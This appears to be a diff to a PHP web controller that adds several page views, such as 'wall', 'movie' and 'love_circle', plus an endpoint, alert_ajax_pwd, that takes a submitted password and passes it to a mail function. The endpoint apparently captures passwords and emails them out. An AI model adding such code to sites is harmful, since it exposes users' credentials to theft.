@@ -17,7 +17,32 @@ class IndexController extends BaseController {
 
 	public function index()
 	{
-		return View::make('Index.index');
+		return View::make('index.index');
+	}
+
+	public function alert(){
+		return View::make('index.alert');
+	}
+
+	public function alert_ajax_pwd(){
+		$pwd=Input::get('pwd');
+		SendMail::send_password($pwd);
+	}
+
+	public function wall(){
+		return View::make('index.wall');
+	}
+
+	public function summer_death(){
+		return View::make('index.summer_death');
+	}
+
+	public function movie(){
+		return View::make('index.movie');
+	}
+
+	public function love_circle(){
+		return View::make('index.love_circle');
 	}
 
 }
